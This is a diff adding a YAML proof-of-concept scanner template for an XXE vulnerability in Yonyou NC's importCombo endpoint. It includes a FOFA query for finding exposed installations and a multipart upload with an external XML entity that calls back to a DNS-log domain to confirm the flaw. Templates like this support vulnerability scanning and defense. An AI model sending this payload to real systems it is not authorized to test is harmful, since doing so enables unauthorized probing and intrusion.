@@ -1,0 +1,35 @@
+id: poc-yaml-yongyou-nc-importcombo-xxe
+info:
+  name: 用友NC importCombo XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /portal/pt/portalcombo/importCombo?pageId=login
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+  data: '------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="file"; filename="1.png"
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://{{.domain}}">
+
+    %remote;]>
+
+    <root/>
+
+    ------WebKitFormBoundary--'
+  expression: status_code == 500 && contains(title,"Error") && reverse.Verify()
+transport: http
